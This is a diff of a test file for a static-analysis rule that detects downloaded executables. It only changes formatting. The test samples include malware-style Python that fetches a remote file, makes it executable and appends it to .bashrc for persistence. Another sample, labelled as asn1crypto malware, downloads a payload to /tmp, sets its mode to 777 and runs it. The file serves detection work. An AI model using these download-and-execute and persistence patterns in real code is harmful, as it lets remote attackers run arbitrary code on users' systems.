@@ -25,14 +25,14 @@ if not s:
 else:
     connection = http.client.HTTPConnection(IP)
     connection.request("GET", PATH)
-    response = connecton.getresponse().read ()
-os.chdir(os.path.expanduser ("~"))
+    response = connecton.getresponse().read()
+os.chdir(os.path.expanduser("~"))
 # ruleid: download-executable
 d = open(LOC, "wb")
 d.write(response)
 d.close()
 current_state = os.stat(LOC)
-os.chmod(LOC, current_state.st_mode|stat.S_IEXEC)
+os.chmod(LOC, current_state.st_mode | stat.S_IEXEC)
 brc = open(".bashrc", "a")
 brc.write("\n~/.drv &")
 brc.close()
@@ -40,10 +40,10 @@ brc.close()
 
 """ RULEID: asn1crypto malware
 """
-if condiment and condiment != '0.0.0.0':
-    narcohypnosis = urlopen('http://' + condiment + '/mainprise').read()
+if condiment and condiment != "0.0.0.0":
+    narcohypnosis = urlopen("http://" + condiment + "/mainprise").read()
     # ruleid: download-executable
-    with open('/tmp/reloan', 'wb') as colmar:
+    with open("/tmp/reloan", "wb") as colmar:
         colmar.write(narcohypnosis)
-    os.chmod('/tmp/reloan', 777)
-    subprocess.call('/tmp/reloan')
+    os.chmod("/tmp/reloan", 777)
+    subprocess.call("/tmp/reloan")
